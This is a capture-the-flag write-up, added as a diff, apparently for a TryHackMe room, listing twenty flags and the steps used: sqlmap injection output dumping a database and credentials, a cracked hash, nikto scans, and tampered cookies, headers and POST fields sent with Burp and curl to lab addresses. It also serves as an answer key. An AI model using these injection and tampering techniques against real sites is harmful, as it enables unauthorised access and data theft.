@@ -1,0 +1,335 @@
+IP: 10.10.54.215
+
+robots.txt
+
+User-agent: * (I don't think this is entirely true, DesKel just wanna to play himself)
+Disallow: /VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=
+
+
+45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Easter 1: THM{4u70b07_r0ll_0u7}
+
+Decode the base64 given above multiple times.
+
+DesKel_secret_base
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Easter 2: THM{f4ll3n_b453}
+
+Found this flag under the source page of /login
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Easter 3: THM{y0u_c4n'7_533_m3}
+
+do you want to exploit this SQL injection? [Y/n] 
+[11:45:29] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[11:45:29] [INFO] fetching database names
+[11:45:29] [INFO] fetching number of databases
+[11:45:29] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                              
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
+[11:45:45] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+4
+[11:45:46] [INFO] retrieved: 
+[11:45:56] [INFO] adjusting time delay to 2 seconds due to good response times
+information_schema
+[11:48:13] [INFO] retrieved: THM_f0und_m3
+[11:50:20] [INFO] retrieved: mysql
+[11:50:59] [INFO] retrieved: performance
+[12:40:57] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                     
+THM{1nj3c7_l1k3_4_b055}
+Database: THM_f0und_m3
+Table: nothing_inside
+[1 entry]
++-------------------------+
+| Easter_4                |
++-------------------------+
+| THM{1nj3c7_l1k3_4_b055} |
++-------------------------+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Easter 4: THM{1nj3c7_l1k3_4_b055}
+
+Easter 5:
+Got the password for the user DesKel from the database:
+[12:49:05] [INFO] fetching columns for table 'user' in database 'THM_f0und_m3'
+[12:49:05] [INFO] retrieved: 2
+[12:49:17] [INFO] retrieved: username
+[12:51:19] [INFO] retrieved: password
+[12:53:48] [INFO] fetching entries for table 'user' in database 'THM_f0und_m3'
+[12:53:48] [INFO] fetching number of entries for table 'user' in database 'THM_f0und_m3'
+[12:53:48] [INFO] retrieved: 2
+[12:54:00] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                     
+05f3672ba34409136aa71b8d00070d1b
+[13:03:35] [INFO] retrieved: DesKel
+[13:05:47] [INFO] retrieved: He is a nice guy,
+
+05f3672ba34409136aa71b8d00070d1b - cutie
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Easter 5: THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql} 
+
+Got this after loggin in
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Easter 6: 
+
+root@LAPTOP-U5913CMD:/home/akshay# nikto -h 10.10.54.215
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.54.215
++ Target Hostname:    10.10.54.215
++ Target Port:        80
++ Start Time:         2020-10-20 11:22:38 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.22 (Ubuntu)
++ Cookie Invited created without the httponly flag
++ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.26
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'busted' found, with contents: Hey, you found me, take this Easter 6: THM{l37'5_p4r7y_h4rd}
+
+
+Easter 6: THM{l37'5_p4r7y_h4rd}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Easter 7:
+Change the cookie of Invited=0 to 1 to get the invitation using burp suite.
+GET / HTTP/1.1
+Host: 10.10.207.251
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: Invited=0
+Connection: close
+
+Set Invited=1
+
+You are now officially invited. Enjoy the easter 7: THM{w3lc0m3!_4nd_w3lc0m3} 
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Easter 8:
+
+Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1
+Change the User-Agent to this one.
+
+You are Rich! Subscribe to THM server ^^ now. Oh btw, Easter 8: THM{h3y_r1ch3r_wh3r3_15_my_k1dn3y}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Easter 9:
+GET /ready/ HTTP/1.1
+Host: 10.10.207.251
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: Invited=0
+Connection: close
+
+HTTP/1.1 200 OK
+Date: Tue, 20 Oct 2020 08:23:29 GMT
+Server: Apache/2.2.22 (Ubuntu)
+X-Powered-By: PHP/5.3.10-1ubuntu3.26
+Vary: Accept-Encoding
+Content-Length: 276
+Connection: close
+Content-Type: text/html
+
+<html>
+	<head>
+		<title>You just press it</title>
+		<meta http-equiv="refresh" content="3;url=http:gone.php" />
+		<p style="text-align:center"><img src="bye.gif"/></p>
+		<!-- Too fast, too good, you can't catch me. I'm sanic Easter 9: THM{60nn4_60_f457} -->
+	</head>
+
+</html>
+
+Easter 9: THM{60nn4_60_f457}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Easter 10:
+
+GET /free_sub/ HTTP/1.1
+
+Host: 10.10.207.251
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: tryhackme.com
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: Invited=0
+Connection: close
+
+Changed the referer to tryhackme.com
+
+Nah, there are no voucher here, I'm too poor to buy a new one XD. But i got an egg for you. Easter 10: THM{50rry_dud3}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Easter 11:
+
+POST / HTTP/1.1
+Host: 10.10.207.251
+Content-Length: 26
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.207.251
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.207.251/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: Invited=0
+Connection: close
+
+dinner=salad&submit=submit
+
+Replace the dinner to egg and you will get the flag.
+You found the secret menu, take the easter 11: THM{366y_b4k3y}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Easter Egg 12:
+
+function ahem()
+ {
+	str1 = '4561737465722031322069732054484d7b68316464336e5f6a355f66316c337d'
+	var hex  = str1.toString();
+	var str = '';
+	for (var n = 0; n < hex.length; n += 2) {
+		str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
+	}
+	return str;
+ }
+
+ahem()
+
+Easter 12 is THM{h1dd3n_j5_f1l3}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Easter Egg 13:
+The page then redirects to /gone.php and gives us a flag.
+
+Happy? Take the egg now. Easter 13: THM{1_c4n'7_b3l13v3_17}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Easter Egg 14:
+
+https://codebeautify.org/base64-to-image-converter
+
+We can see a Easter Egg 14 with a base64 encoded image.
+You can decode it using the above url
+
+-> Easter 14 : THM{d1r3c7_3mb3d}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Easter Egg 15:
+
+Guess the combination
+Your answer: GameOver
+Good job on completing the puzzle, Easter 15: THM{ju57_4_64m3}
+
+Your hash: 51 89 77 93 126 14 93 10
+
+hints: 51 89 77 93 126 14 93 10 
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Easter Egg 16:
+
+root@LAPTOP-U5913CMD:/home/akshay# curl -d "button1=button1&button2=button2&button3=button3" -X POST http://10.10.191.58/game2/
+<html>
+        <head>
+                <title>Game 2</title>
+                <h1>Press the button simultaneously</h1>
+        </head>
+        <body>
+
+        <form method="POST">
+                <input type="hidden" name="button1" value="button1">
+                <button name="submit" value="submit">Button 1</button>
+        </form>
+
+        <form method="POST">
+                <input type="hidden" name="button2" value="button2">
+                <button name="submit" value="submit">Button 2</button>
+        </form>
+
+        <form method="POST">
+                <input type="hidden" name="button3" value="button3">
+                <button name="submit" value="submit">Button 3</button>
+        </form>
+        Just temper the code and you are good to go. Easter 16: THM{73mp3r_7h3_h7ml}    </body>
+</html>
+
+root@LAPTOP-U5913CMD:/home/akshay# 
+
+Easter 16: THM{73mp3r_7h3_h7ml}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Easter Egg 17:
+
+For easter 17 we first have to convert binary to decimal to hex to text:
+bin -> dec > hex > text
+
+100010101100001011100110111010001100101011100100010000000110001001101110011101000100000010101000100100001001101011110110110101000110101010111110110101000110101010111110110101100110011011100000101111101100100001100110110001100110000011001000011001101111101
+Easter 17: THM{j5_j5_k3p_d3c0d3}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Easter egg 18:
+curl -H "egg:Yes" http://10.10.191.58 
+
+
+        <h2>Sometime, you just need to say 'YES' to the 'egg'. The page will definately roll the egg for you</h2>
+        That's it, you just need to say YESSSSSSSSSS. Easter 18: THM{70ny_r0ll_7h3_366} <img src="egg.gif"/>
+
+-> Easter 18: THM{70ny_r0ll_7h3_366}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+http://10.10.54.215/small
+
+Easter 19: THM{700_5m4ll_3yy}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Easter Egg 20:
+
+(username:DesKel, password:heIsDumb).
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Collection_CTF_2# curl -s -d "username=DesKel&password=heIsDumb" -X POST  http://10.10.207.251 
+
+We make a POST request to the website using parameters as username=DesKel and password=heIsDumb
+
+
+<h2>Sometime, you just need to say 'YES' to the 'egg'. The page will definately roll the egg for you</h2>
+                <img src="egg.gif"/><img src="egg.gif"/><img src="egg.gif"/><img src="egg.gif"/><img src="egg.gif"/>
+        <h1>DID YOU KNOW: All swans in England belong to the queen. </h1>
+        <img height="2" width="2000" src="small.png"/>
+        <h3> Hey! I got the easter 20 for you. I leave the credential for you to POST (username:DesKel, password:heIsDumb). Please, I beg you. Don't let him know.</h3>
+        Okay, you pass, Easter 20: THM{17_w45_m3_4ll_4l0n6}     <br><br><br>
+        <h2 style="text-align:center;"> That's all! Thank you!</h2>
+        <p style="text-align:center;"><img src="ty.gif"/></p>
+        <p>Hello there, thank you for taking part the CTF collection Vol.2. The room is created by me (cough), DesKel. Hope you enjoy the room and remember upvote it if you like it. Bye bye :)</p>
+        <p>Deskel is too lazy to beutify the web, please Forgive him </p>
+
+Easter 20: THM{17_w45_m3_4ll_4l0n6} 
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+-Voker2311
